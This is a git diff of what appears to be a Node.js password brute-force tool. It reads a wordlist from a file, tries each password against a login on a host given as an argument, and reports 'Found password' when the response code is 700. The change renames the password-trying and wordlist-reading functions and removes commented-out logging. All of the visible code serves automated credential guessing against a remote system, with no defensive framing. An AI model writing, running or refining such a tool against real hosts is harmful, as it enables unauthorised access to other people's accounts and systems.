@@ -39,11 +39,6 @@ function LoginHandler(oTracer, resp) {
       });
       var outArr = out2.toString().split(",");
       oTracer.found = parseInt(outArr[0]);
-      // if (parseInt(outArr[0]) == 700) {
-      //   console.log('password: ' + oTracer.m_sPassword + ' - ' + '\x1b[32mSuccess!\x1b[0m');
-      // } else {
-      //   console.log('password: ' + oTracer.m_sPassword + ' - ' + '\x1b[31mFail\x1b[0m');
-      // }
   }
 }
 
@@ -64,10 +59,9 @@ function Login(oTracer) {
     LoginHandler(oTracer, out1.toString());
 }
 
-function PasswordTry(pass){
+function CredTry(pass){
   var sPassword = pass;
   var oLoginTracer = new Object();
-  var oTracer = new Object();
   var found;
   oLoginTracer.m_sPublicKey1 = "0";
   oLoginTracer.m_sPublicKey2 = "0";
@@ -166,7 +160,7 @@ function StartPrint(){
   console.log('       \x1b[37m---------           -------\x1b[0m', '');
 }
 
-function GetPassFile(path){
+function GetCredsFile(path){
   return fs.readFileSync(path, 'utf8').split("\n");
 }
 
@@ -175,11 +169,11 @@ function GetPassFile(path){
 
 StartPrint();
 var HOST = process.argv[2];
-var passwords = GetPassFile(process.argv[3]);
+var passwords = GetCredsFile(process.argv[3]);
 var passwordsLength = passwords.length;
 for (var i = 0; i < passwordsLength-1; i++) {
   space_len = new Array(Math.max(0, 9 - passwords[i].length) + 13 - Math.max(0,passwords[i].length - 9)).join(' ');
-  if (PasswordTry(passwords[i]) == 700) {
+  if (CredTry(passwords[i]) == 700) {
     console.log('       ' + passwords[i] + space_len + '\x1b[32mSuccess!\x1b[0m');
     console.log('\x1b[32m\n\n       Found password: %s\x1b[0m\n', passwords[i]);
     break;
